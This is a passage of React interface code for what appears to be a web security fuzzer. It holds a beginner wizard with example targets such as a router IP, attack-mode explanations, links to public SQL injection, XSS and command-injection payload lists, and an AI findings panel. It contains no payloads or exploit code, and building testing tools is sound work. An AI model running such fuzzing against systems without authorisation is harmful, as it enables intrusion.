                <Paper sx={{ p: 3, bgcolor: "background.paper", borderRadius: 2 }}>
                  <Typography variant="subtitle1" fontWeight={600} sx={{ mb: 2 }}>
                    {WIZARD_STEPS[wizardStep]?.description}
                  </Typography>
                  
                  <Box sx={{ 
                    bgcolor: alpha("#10b981", 0.05), 
                    p: 2.5, 
                    borderRadius: 2, 
                    mb: 3,
                    borderLeft: `4px solid #10b981`,
                  }}>
                    <ReactMarkdown
                      components={{
                        p: ({ children }) => <Typography variant="body2" paragraph sx={{ mb: 1.5, lineHeight: 1.8 }}>{children}</Typography>,
                        strong: ({ children }) => <Typography component="span" fontWeight={700}>{children}</Typography>,
                        li: ({ children }) => <Typography component="li" variant="body2" sx={{ mb: 0.5 }}>{children}</Typography>,
                        code: ({ children }) => (
                          <Box 
                            component="code" 
                            sx={{ 
                              bgcolor: "rgba(0,0,0,0.2)", 
                              px: 0.75, 
                              py: 0.25, 
                              borderRadius: 0.5, 
                              fontFamily: "monospace",
                              fontSize: "0.85em",
                            }}
                          >
                            {children}
                          </Box>
                        ),
                      }}
                    >
                      {WIZARD_STEPS[wizardStep]?.longDescription || ""}
                    </ReactMarkdown>
                  </Box>

                  {/* Validation feedback */}
                  {wizardStep > 0 && wizardStep < 5 && (
                    <Alert 
                      severity={WIZARD_STEPS[wizardStep]?.validation(config) ? "success" : "warning"}
                      sx={{ mb: 2 }}
                    >
                      {WIZARD_STEPS[wizardStep]?.validation(config) 
                        ? "✅ Great! This step is complete. You can continue to the next step."
                        : WIZARD_STEPS[wizardStep]?.validationMessage}
                    </Alert>
                  )}

                  {/* Quick action buttons based on current step */}
                  {wizardStep === 1 && (
                    <Box sx={{ display: "flex", gap: 2, flexWrap: "wrap" }}>
                      <Button
                        variant="outlined"
                        size="small"
                        onClick={() => {
                          setConfig(prev => ({
                            ...prev,
                            targetUrl: "http://192.168.1.1/FUZZ",
                          }));
                        }}
                      >
                        Try Example: Router Discovery
                      </Button>
                      <Button
                        variant="outlined"
                        size="small"
                        onClick={() => {
                          setConfig(prev => ({
                            ...prev,
                            targetUrl: "http://example.com/api/users/FUZZ",
                          }));
                        }}
                      >
                        Try Example: API User IDs
                      </Button>
                    </Box>
                  )}

                  {wizardStep === 2 && config.targetUrl.includes("FUZZ") && config.positions.length === 0 && (
                    <Button
                      variant="contained"
                      color="success"
                      onClick={() => {
                        setConfig(prev => ({
                          ...prev,
                          positions: ["FUZZ"],
                          payloads: [[]],
                        }));
                      }}
                    >
                      ✨ Auto-detect FUZZ position
                    </Button>
                  )}

                  {wizardStep === 3 && (
                    <Box sx={{ display: "flex", gap: 2, flexWrap: "wrap" }}>
                      <Button
                        variant="contained"
                        color="primary"
                        size="small"
                        onClick={() => {
                          const wordlist = BUILTIN_WORDLISTS.find(w => w.name === "Common Directories");
                          if (wordlist && config.positions.length > 0) {
                            setConfig(prev => {
                              const newPayloads = [...prev.payloads];
                              newPayloads[0] = wordlist.sample;
                              return { ...prev, payloads: newPayloads };
                            });
                          }
                        }}
                        disabled={config.positions.length === 0}
                      >
                        📁 Load Common Directories (Recommended)
                      </Button>
                      <Button
                        variant="outlined"
                        size="small"
                        onClick={() => setActiveTab(3)}
                      >
                        Browse All Wordlists
                      </Button>
                    </Box>
                  )}

                  {wizardStep === 5 && (
                    <Box sx={{ display: "flex", gap: 2, flexWrap: "wrap", alignItems: "center" }}>
                      <Button
                        variant="contained"
                        color="success"
                        size="large"
                        startIcon={isRunning ? <StopIcon /> : <PlayArrowIcon />}
                        onClick={isRunning ? stopFuzzing : startFuzzing}
                        disabled={!config.targetUrl || config.payloads.every(p => p.length === 0)}
                        sx={{
                          background: isRunning ? "#dc2626" : "linear-gradient(135deg, #10b981 0%, #059669 100%)",
                          px: 4,
                          py: 1.5,
                        }}
                      >
                        {isRunning ? "Stop Fuzzing" : "🚀 Start My First Fuzzing!"}
                      </Button>
                      {results.length > 0 && (
                        <Chip 
                          label={`${results.length} results collected`}
                          color="success"
                          variant="outlined"
                        />
                      )}
                    </Box>
                  )}
                </Paper>
              </Grid>

              {/* Tip sidebar */}
              <Grid item xs={12} md={4}>
                <Paper sx={{ p: 2.5, bgcolor: alpha("#f59e0b", 0.08), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2, color: "#d97706" }}>
                    <LightbulbIcon fontSize="small" />
                    Pro Tip
                  </Typography>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    {WIZARD_STEPS[wizardStep]?.tip}
                  </Typography>
                </Paper>

                {/* Current configuration summary */}
                <Paper sx={{ p: 2.5, mt: 2, bgcolor: alpha("#6366f1", 0.05), borderRadius: 2, border: `1px solid ${alpha("#6366f1", 0.2)}` }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2, color: "#4f46e5" }}>
                    <AssessmentIcon fontSize="small" />
                    Your Progress
                  </Typography>
                  <List dense sx={{ "& .MuiListItem-root": { py: 0.5 } }}>
                    <ListItem>
                      <ListItemIcon sx={{ minWidth: 32 }}>
                        {config.targetUrl ? <CheckCircleIcon color="success" fontSize="small" /> : <ErrorIcon color="disabled" fontSize="small" />}
                      </ListItemIcon>
                      <ListItemText 
                        primary="Target URL"
                        secondary={config.targetUrl ? config.targetUrl.substring(0, 30) + (config.targetUrl.length > 30 ? "..." : "") : "Not set"}
                        primaryTypographyProps={{ variant: "caption", fontWeight: 600 }}
                        secondaryTypographyProps={{ variant: "caption" }}
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon sx={{ minWidth: 32 }}>
                        {config.positions.length > 0 ? <CheckCircleIcon color="success" fontSize="small" /> : <ErrorIcon color="disabled" fontSize="small" />}
                      </ListItemIcon>
                      <ListItemText 
                        primary="Positions"
                        secondary={config.positions.length > 0 ? `${config.positions.length} position(s)` : "None"}
                        primaryTypographyProps={{ variant: "caption", fontWeight: 600 }}
                        secondaryTypographyProps={{ variant: "caption" }}
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon sx={{ minWidth: 32 }}>
                        {config.payloads.some(p => p.length > 0) ? <CheckCircleIcon color="success" fontSize="small" /> : <ErrorIcon color="disabled" fontSize="small" />}
                      </ListItemIcon>
                      <ListItemText 
                        primary="Payloads"
                        secondary={config.payloads.some(p => p.length > 0) ? `${config.payloads.reduce((a, p) => a + p.length, 0)} payloads` : "None loaded"}
                        primaryTypographyProps={{ variant: "caption", fontWeight: 600 }}
                        secondaryTypographyProps={{ variant: "caption" }}
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon sx={{ minWidth: 32 }}>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText 
                        primary="Attack Mode"
                        secondary={ATTACK_MODES[config.attackMode]?.name || config.attackMode}
                        primaryTypographyProps={{ variant: "caption", fontWeight: 600 }}
                        secondaryTypographyProps={{ variant: "caption" }}
                      />
                    </ListItem>
                  </List>
                </Paper>
              </Grid>
            </Grid>

            {/* Navigation buttons */}
            <Box sx={{ display: "flex", justifyContent: "space-between", mt: 3, pt: 2, borderTop: `1px solid ${alpha("#10b981", 0.2)}` }}>
              <Button
                variant="outlined"
                startIcon={<NavigateBeforeIcon />}
                onClick={() => setWizardStep(Math.max(0, wizardStep - 1))}
                disabled={wizardStep === 0}
              >
                Previous Step
              </Button>
              <Box sx={{ display: "flex", gap: 2 }}>
                {wizardStep === WIZARD_STEPS.length - 1 ? (
                  <Button
                    variant="contained"
                    color="success"
                    onClick={() => setWizardMode(false)}
                    startIcon={<CheckIcon />}
                  >
                    Finish Wizard
                  </Button>
                ) : (
                  <Button
                    variant="contained"
                    endIcon={<NavigateNextIcon />}
                    onClick={() => setWizardStep(Math.min(WIZARD_STEPS.length - 1, wizardStep + 1))}
                    sx={{
                      background: "linear-gradient(135deg, #10b981 0%, #059669 100%)",
                    }}
                  >
                    Next Step
                  </Button>
                )}
              </Box>
            </Box>
          </Paper>
        </Collapse>

        {/* Usage Guide Panel */}
        <Collapse in={showGuide}>
          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f97316", 0.05), border: `1px solid ${alpha("#f97316", 0.2)}` }}>
            <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, color: "#ea580c" }}>
              <TipsAndUpdatesIcon />
              How to Use the Security Fuzzer
            </Typography>
            
            <Grid container spacing={3}>
              {/* Step-by-step guide */}
              <Grid item xs={12} md={6}>
                <Stepper activeStep={guidedSteps.filter(s => s.completed).length} orientation="vertical">
                  {guidedSteps.map((step, index) => (
                    <Step key={step.label} completed={step.completed}>
                      <StepLabel
                        optional={
                          <Typography variant="caption" color="text.secondary">
                            {step.description}
                          </Typography>
                        }
                      >
                        {step.label}
                      </StepLabel>
                    </Step>
                  ))}
                </Stepper>
              </Grid>
              
              {/* Quick tips */}
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" fontWeight={700} gutterBottom>
                  🚀 Quick Tips
                </Typography>
                <List dense>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                    <ListItemText 
                      primary="Mark positions with §0§, §1§, etc." 
                      secondary="Example: /api/users?id=§0§&token=§1§"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                    <ListItemText 
                      primary="Start with Sniper mode for single positions" 
                      secondary="Use Cluster Bomb for exhaustive multi-position testing"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                    <ListItemText 
                      primary="Look for response length anomalies" 
                      secondary="Different lengths often indicate interesting behavior"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                    <ListItemText 
                      primary="Use AI Analysis after fuzzing" 
                      secondary="Get automated insights and vulnerability detection"
                    />
                  </ListItem>
                </List>
                
                <Box sx={{ mt: 2 }}>
                  <Typography variant="subtitle2" fontWeight={700} gutterBottom>
                    🛡️ Security Tests Available
                  </Typography>
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                    {["SQL Injection", "XSS", "Path Traversal", "Command Injection", "SSTI", "Parameter Tampering"].map(test => (
                      <Chip key={test} label={test} size="small" variant="outlined" sx={{ borderColor: alpha("#f97316", 0.5) }} />
                    ))}
                  </Box>
                </Box>
              </Grid>

              {/* Video Tutorials Section */}
              <Grid item xs={12}>
                <Divider sx={{ my: 2 }} />
                <Typography variant="subtitle1" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                  🎬 Video Tutorials & Visual Guides
                </Typography>
                <Grid container spacing={2}>
                  {/* Tutorial Card 1: Getting Started */}
                  <Grid item xs={12} md={4}>
                    <Card 
                      sx={{ 
                        height: "100%",
                        cursor: "pointer",
                        transition: "all 0.2s ease",
                        border: `1px solid ${alpha("#f97316", 0.2)}`,
                        "&:hover": { 
                          transform: "translateY(-4px)",
                          boxShadow: `0 8px 24px ${alpha("#f97316", 0.2)}`,
                          borderColor: "#f97316",
                        },
                      }}
                      onClick={() => window.open("https://www.youtube.com/results?search_query=web+fuzzing+security+testing+tutorial", "_blank")}
                    >
                      <CardContent>
                        <Box sx={{ 
                          bgcolor: alpha("#f97316", 0.1), 
                          borderRadius: 2, 
                          p: 2, 
                          mb: 2,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          position: "relative",
                          overflow: "hidden",
                        }}>
                          <Box sx={{
                            position: "absolute",
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            bgcolor: alpha("#000", 0.3),
                            borderRadius: 2,
                          }}>
                            <PlayArrowIcon sx={{ fontSize: 48, color: "#fff" }} />
                          </Box>
                          <RocketLaunchIcon sx={{ fontSize: 60, color: alpha("#f97316", 0.3) }} />
                        </Box>
                        <Typography variant="subtitle2" fontWeight={700} gutterBottom>
                          🚀 Getting Started with Web Fuzzing
                        </Typography>
                        <Typography variant="body2" color="text.secondary">
                          Learn the basics: what is fuzzing, why it matters, and how to set up your first security test.
                        </Typography>
                        <Box sx={{ mt: 1, display: "flex", gap: 0.5 }}>
                          <Chip label="5 min" size="small" variant="outlined" />
                          <Chip label="Beginner" size="small" color="success" variant="outlined" />
                        </Box>
                      </CardContent>
                    </Card>
                  </Grid>

                  {/* Tutorial Card 2: Understanding Attack Modes */}
                  <Grid item xs={12} md={4}>
                    <Card 
                      sx={{ 
                        height: "100%",
                        cursor: "pointer",
                        transition: "all 0.2s ease",
                        border: `1px solid ${alpha("#3b82f6", 0.2)}`,
                        "&:hover": { 
                          transform: "translateY(-4px)",
                          boxShadow: `0 8px 24px ${alpha("#3b82f6", 0.2)}`,
                          borderColor: "#3b82f6",
                        },
                      }}
                      onClick={() => window.open("https://www.youtube.com/results?search_query=burp+suite+intruder+attack+modes+sniper+battering+ram", "_blank")}
                    >
                      <CardContent>
                        <Box sx={{ 
                          bgcolor: alpha("#3b82f6", 0.1), 
                          borderRadius: 2, 
                          p: 2, 
                          mb: 2,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          position: "relative",
                          overflow: "hidden",
                        }}>
                          <Box sx={{
                            position: "absolute",
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            bgcolor: alpha("#000", 0.3),
                            borderRadius: 2,
                          }}>
                            <PlayArrowIcon sx={{ fontSize: 48, color: "#fff" }} />
                          </Box>
                          <CategoryIcon sx={{ fontSize: 60, color: alpha("#3b82f6", 0.3) }} />
                        </Box>
                        <Typography variant="subtitle2" fontWeight={700} gutterBottom>
                          🎯 Understanding Attack Modes
                        </Typography>
                        <Typography variant="body2" color="text.secondary">
                          Deep dive into Sniper, Battering Ram, Pitchfork, and Cluster Bomb - when to use each mode.
                        </Typography>
                        <Box sx={{ mt: 1, display: "flex", gap: 0.5 }}>
                          <Chip label="10 min" size="small" variant="outlined" />
                          <Chip label="Intermediate" size="small" color="warning" variant="outlined" />
                        </Box>
                      </CardContent>
                    </Card>
                  </Grid>

                  {/* Tutorial Card 3: SQL Injection Testing */}
                  <Grid item xs={12} md={4}>
                    <Card 
                      sx={{ 
                        height: "100%",
                        cursor: "pointer",
                        transition: "all 0.2s ease",
                        border: `1px solid ${alpha("#ef4444", 0.2)}`,
                        "&:hover": { 
                          transform: "translateY(-4px)",
                          boxShadow: `0 8px 24px ${alpha("#ef4444", 0.2)}`,
                          borderColor: "#ef4444",
                        },
                      }}
                      onClick={() => window.open("https://www.youtube.com/results?search_query=sql+injection+fuzzing+testing+tutorial", "_blank")}
                    >
                      <CardContent>
                        <Box sx={{ 
                          bgcolor: alpha("#ef4444", 0.1), 
                          borderRadius: 2, 
                          p: 2, 
                          mb: 2,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          position: "relative",
                          overflow: "hidden",
                        }}>
                          <Box sx={{
                            position: "absolute",
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            bgcolor: alpha("#000", 0.3),
                            borderRadius: 2,
                          }}>
                            <PlayArrowIcon sx={{ fontSize: 48, color: "#fff" }} />
                          </Box>
                          <BugReportIcon sx={{ fontSize: 60, color: alpha("#ef4444", 0.3) }} />
                        </Box>
                        <Typography variant="subtitle2" fontWeight={700} gutterBottom>
                          💉 SQL Injection Testing
                        </Typography>
                        <Typography variant="body2" color="text.secondary">
                          Practical guide to finding SQL injection vulnerabilities using payloads and analyzing responses.
                        </Typography>
                        <Box sx={{ mt: 1, display: "flex", gap: 0.5 }}>
                          <Chip label="15 min" size="small" variant="outlined" />
                          <Chip label="Advanced" size="small" color="error" variant="outlined" />
                        </Box>
                      </CardContent>
                    </Card>
                  </Grid>

                  {/* Quick Reference Cards */}
                  <Grid item xs={12}>
                    <Typography variant="subtitle2" fontWeight={700} sx={{ mt: 1, mb: 1 }}>
                      📖 Quick Reference Cheat Sheets
                    </Typography>
                    <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                      <Chip 
                        label="SQL Injection Payloads"
                        icon={<CodeIcon />}
                        onClick={() => window.open("https://github.com/payloadbox/sql-injection-payload-list", "_blank")}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#ef4444", 0.1) } }}
                      />
                      <Chip 
                        label="XSS Payloads"
                        icon={<CodeIcon />}
                        onClick={() => window.open("https://github.com/payloadbox/xss-payload-list", "_blank")}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#f97316", 0.1) } }}
                      />
                      <Chip 
                        label="Command Injection"
                        icon={<CodeIcon />}
                        onClick={() => window.open("https://github.com/payloadbox/command-injection-payload-list", "_blank")}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#8b5cf6", 0.1) } }}
                      />
                      <Chip 
                        label="Directory Traversal"
                        icon={<FolderIcon />}
                        onClick={() => window.open("https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal", "_blank")}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#3b82f6", 0.1) } }}
                      />
                      <Chip 
                        label="OWASP Testing Guide"
                        icon={<ShieldIcon />}
                        onClick={() => window.open("https://owasp.org/www-project-web-security-testing-guide/", "_blank")}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#10b981", 0.1) } }}
                      />
                    </Box>
                  </Grid>

                  {/* Interactive Examples */}
                  <Grid item xs={12}>
                    <Alert severity="info" sx={{ mt: 1 }}>
                      <Typography variant="body2">
                        <strong>💡 Pro Tip:</strong> Click on the <strong>"Beginner Wizard"</strong> button above for an interactive, 
                        step-by-step walkthrough that guides you through your first fuzzing session with real-time validation and tips!
                      </Typography>
                    </Alert>
                  </Grid>
                </Grid>
              </Grid>
            </Grid>
          </Paper>
        </Collapse>

        {/* AI Analysis Results */}
        {aiAnalysis && (
          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.3)}` }}>
            <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
              <Typography variant="h6" sx={{ display: "flex", alignItems: "center", gap: 1, color: "#7c3aed" }}>
                <AssessmentIcon />
                AI Security Analysis
              </Typography>
              <Box sx={{ display: "flex", gap: 1, alignItems: "center" }}>
                <Button
                  variant="outlined"
                  size="small"
                  startIcon={generatingFullReport ? <CircularProgress size={16} /> : <AssessmentIcon />}
                  onClick={generateFullAiReport}
                  disabled={generatingFullReport || results.length === 0}
                  sx={{ borderColor: "#7c3aed", color: "#7c3aed" }}
                >
                  {generatingFullReport ? "Generating..." : "View Full Report"}
                </Button>
                <Chip 
                  label={aiAnalysis.riskLevel.toUpperCase()} 
                  color={aiAnalysis.riskLevel === "critical" ? "error" : aiAnalysis.riskLevel === "high" ? "error" : aiAnalysis.riskLevel === "medium" ? "warning" : "success"}
                  size="small"
                />
              </Box>
            </Box>
            
            <Alert severity={aiAnalysis.riskLevel === "critical" || aiAnalysis.riskLevel === "high" ? "error" : aiAnalysis.riskLevel === "medium" ? "warning" : "info"} sx={{ mb: 2 }}>
              {aiAnalysis.summary}
            </Alert>
            
            {aiAnalysis.findings.length > 0 && (
              <Box sx={{ mb: 2 }}>
                <Typography variant="subtitle2" fontWeight={700} gutterBottom>Findings</Typography>
                {aiAnalysis.findings.map((finding, i) => (
                  <Accordion key={i} sx={{ bgcolor: "background.paper" }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        <Chip 
                          label={finding.severity} 
                          size="small" 
                          color={finding.severity === "critical" || finding.severity === "high" ? "error" : finding.severity === "medium" ? "warning" : "info"}
                        />
                        <Typography variant="body2" fontWeight={600}>{finding.type}</Typography>
                      </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ mb: 1 }}>{finding.description}</Typography>
                      <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                        <strong>Evidence:</strong>
                      </Typography>
                      <Box sx={{ pl: 2, mb: 1 }}>
                        {finding.evidence.map((e, j) => (
                          <Typography key={j} variant="caption" sx={{ display: "block", fontFamily: "monospace" }}>
                            • {e}
                          </Typography>
                        ))}
                      </Box>
                      <Alert severity="info" sx={{ mt: 1 }}>
                        <Typography variant="caption"><strong>Recommendation:</strong> {finding.recommendation}</Typography>
                      </Alert>
                    </AccordionDetails>
                  </Accordion>
                ))}
              </Box>
            )}
            
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" fontWeight={700} gutterBottom>Patterns Detected</Typography>
                <List dense>
                  {aiAnalysis.patterns.map((p, i) => (
                    <ListItem key={i} sx={{ py: 0 }}>
                      <ListItemIcon><InfoIcon fontSize="small" color="primary" /></ListItemIcon>
                      <ListItemText primary={p} />
                    </ListItem>
                  ))}
                </List>
              </Grid>
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" fontWeight={700} gutterBottom>Recommendations</Typography>
                <List dense>
                  {aiAnalysis.recommendations.map((r, i) => (
                    <ListItem key={i} sx={{ py: 0 }}>
                      <ListItemIcon><TipsAndUpdatesIcon fontSize="small" color="warning" /></ListItemIcon>
                      <ListItemText primary={r} />
                    </ListItem>
                  ))}
                </List>
              </Grid>
            </Grid>
          </Paper>
        )}

        {/* Generate AI Report Button (when no analysis yet) */}
        {!aiAnalysis && results.length > 0 && !isRunning && (
          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.3)}`, textAlign: "center" }}>
            <AssessmentIcon sx={{ fontSize: 48, color: "#8b5cf6", mb: 2 }} />
            <Typography variant="h6" sx={{ mb: 1, color: "#7c3aed" }}>
              AI Security Analysis Available
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Run comprehensive AI analysis on your {results.length} fuzzing results to detect vulnerabilities, anomalies, and security patterns.
            </Typography>
            <Button
              variant="contained"
              startIcon={generatingFullReport ? <CircularProgress size={20} color="inherit" /> : <AssessmentIcon />}
              onClick={generateFullAiReport}
              disabled={generatingFullReport}
              sx={{ bgcolor: "#7c3aed", "&:hover": { bgcolor: "#6d28d9" } }}
            >
              {generatingFullReport ? "Analyzing..." : "Generate AI Security Report"}
            </Button>
          </Paper>
        )}

        {/* Quick Stats */}
        {stats.startTime && (
          <Grid container spacing={2} sx={{ mt: 2 }}>
            <Grid item xs={6} sm={3}>
              <Card sx={{ bgcolor: alpha("#3b82f6", 0.1), border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
                <CardContent sx={{ py: 1.5 }}>
                  <Typography variant="caption" color="text.secondary">Total Requests</Typography>
                  <Typography variant="h5" fontWeight={700} color="#3b82f6">{stats.totalRequests}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={6} sm={3}>
              <Card sx={{ bgcolor: alpha("#10b981", 0.1), border: `1px solid ${alpha("#10b981", 0.3)}` }}>
                <CardContent sx={{ py: 1.5 }}>
                  <Typography variant="caption" color="text.secondary">Success</Typography>
                  <Typography variant="h5" fontWeight={700} color="#10b981">{stats.successCount}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={6} sm={3}>
              <Card sx={{ bgcolor: alpha("#ef4444", 0.1), border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
                <CardContent sx={{ py: 1.5 }}>
                  <Typography variant="caption" color="text.secondary">Errors</Typography>
                  <Typography variant="h5" fontWeight={700} color="#ef4444">{stats.errorCount}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={6} sm={3}>
              <Card sx={{ bgcolor: alpha("#8b5cf6", 0.1), border: `1px solid ${alpha("#8b5cf6", 0.3)}` }}>
                <CardContent sx={{ py: 1.5 }}>
                  <Typography variant="caption" color="text.secondary">Avg Response</Typography>
                  <Typography variant="h5" fontWeight={700} color="#8b5cf6">{stats.avgResponseTime.toFixed(0)}ms</Typography>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        )}
      </Box>

      {/* Progress Bar */}
      {isRunning && (
        <Box sx={{ mb: 3 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1 }}>
            <Typography variant="body2" color="text.secondary">
              Progress: {progress.current} / {progress.total} requests
            </Typography>
            <Typography variant="body2" color="text.secondary">
              {((progress.current / progress.total) * 100).toFixed(1)}%
            </Typography>
          </Box>
          <LinearProgress 
            variant="determinate" 
            value={(progress.current / progress.total) * 100}
            sx={{
              height: 8,
              borderRadius: 4,
              bgcolor: alpha("#f97316", 0.1),
              "& .MuiLinearProgress-bar": {
                background: "linear-gradient(135deg, #f97316 0%, #ea580c 100%)",
                borderRadius: 4,
              },
            }}
          />
        </Box>
      )}

      {/* Tabs */}
      <Box sx={{ borderBottom: 1, borderColor: "divider", mb: 3 }}>
        <Tabs value={activeTab} onChange={(_, v) => setActiveTab(v)} variant="scrollable" scrollButtons="auto">
          <Tab label="Configuration" icon={<HttpIcon />} iconPosition="start" />
          <Tab label="Positions & Payloads" icon={<TextFieldsIcon />} iconPosition="start" />
          <Tab label="Attack Modes" icon={<SecurityIcon />} iconPosition="start" />
          <Tab label="Wordlists" icon={<ListAltIcon />} iconPosition="start" />
          <Tab label="Advanced" icon={<BuildIcon />} iconPosition="start" />
          <Tab 
            label={
              <Badge badgeContent={filteredResults.length} color="primary" max={9999}>
                Results
              </Badge>
            } 
            icon={<DataObjectIcon />} 
            iconPosition="start" 
          />
          <Tab 
            label={
              <Badge badgeContent={vulnerabilityFindings.length} color="error" max={99}>
                Smart Detection
              </Badge>
            }
            icon={<BugReportIcon />}
            iconPosition="start"
          />
          <Tab 
            label={
              <Badge badgeContent={sessions.length} color="info" max={99}>
                Sessions
              </Badge>
            }
            icon={<FolderIcon />}
            iconPosition="start"
          />
          <Tab 
            label={
              <Badge badgeContent={wsFindings.length} color="warning" max={99}>
                WebSocket Fuzzing
              </Badge>
            }
            icon={<CableIcon />}
            iconPosition="start"
          />
          <Tab 
            label="Coverage"
            icon={<RadarIcon />}
            iconPosition="start"
          />
        </Tabs>
      </Box>

      {/* Tab 0: Configuration */}
      {activeTab === 0 && (
        <Grid container spacing={3}>
          {/* Quick Start Scenarios */}
          <Grid item xs={12}>
            <Paper 
              sx={{ 
                p: 2, 
                mb: 2, 
                background: `linear-gradient(135deg, ${alpha("#f97316", 0.1)}, ${alpha("#8b5cf6", 0.05)})`,
                border: `1px solid ${alpha("#f97316", 0.2)}`,
                borderRadius: 3,
              }}
            >
              <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
                <Typography variant="h6" sx={{ display: "flex", alignItems: "center", gap: 1, fontWeight: 700 }}>
                  🚀 Quick Start - Choose a Scenario
                </Typography>
                <Chip label="Recommended for beginners" size="small" color="primary" />
              </Box>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                Select a pre-configured scenario to get started quickly. This will set up the URL, headers, and payloads for you.
              </Typography>
              <Grid container spacing={1}>
                {(Object.entries(SCENARIO_TEMPLATES) as [keyof typeof SCENARIO_TEMPLATES, typeof SCENARIO_TEMPLATES[keyof typeof SCENARIO_TEMPLATES]][]).map(([key, scenario]) => (
                  <Grid item xs={6} sm={4} md={3} key={key}>
                    <Button
                      fullWidth
                      variant="outlined"
                      onClick={() => applyScenario(key)}
                      sx={{ 
                        textTransform: "none", 
                        justifyContent: "flex-start", 
                        py: 1,
                        borderColor: alpha("#f97316", 0.3),
                        "&:hover": {
                          borderColor: "#f97316",
                          bgcolor: alpha("#f97316", 0.05),
                        },
                      }}
                    >
                      <Box sx={{ textAlign: "left" }}>
                        <Typography variant="body2" fontWeight={600}>{scenario.name}</Typography>
                      </Box>
                    </Button>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Grid>

          <Grid item xs={12} md={8}>
            <Card>
              <CardContent>
                <Typography variant="h6" fontWeight={600} sx={{ mb: 1 }}>
                  Request Configuration
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
                  Configure where to send requests. Use <code style={{ background: alpha("#f97316", 0.1), padding: "2px 6px", borderRadius: 4 }}>FUZZ</code> or <code style={{ background: alpha("#f97316", 0.1), padding: "2px 6px", borderRadius: 4 }}>§0§</code> to mark where payloads should be inserted.
                </Typography>
                
                <Grid container spacing={2}>
                  <Grid item xs={12} sm={2}>
                    <Tooltip title="GET: Retrieve data | POST: Send data (forms/logins) | PUT/PATCH: Update | DELETE: Remove">
                      <FormControl fullWidth size="small">
                        <InputLabel>Method</InputLabel>
                        <Select
                          value={config.method}
                          label="Method"
                          onChange={(e) => setConfig(prev => ({ ...prev, method: e.target.value }))}
                        >
                          {["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"].map(m => (
                            <MenuItem key={m} value={m}>{m}</MenuItem>
                          ))}
                        </Select>
                      </FormControl>
                    </Tooltip>
                  </Grid>
                  <Grid item xs={12} sm={10}>
                    <Box sx={{ display: "flex", alignItems: "flex-start" }}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Target URL"
                        placeholder="http://192.168.1.1/FUZZ"
                        value={config.targetUrl}
                        onChange={(e) => setConfig(prev => ({ ...prev, targetUrl: e.target.value }))}
                        helperText={
                          <span>
                            Examples: <code>http://192.168.1.1/FUZZ</code> (directory discovery) | <code>http://target.com/search?q=FUZZ</code> (parameter fuzzing)
                          </span>
                        }
                      />
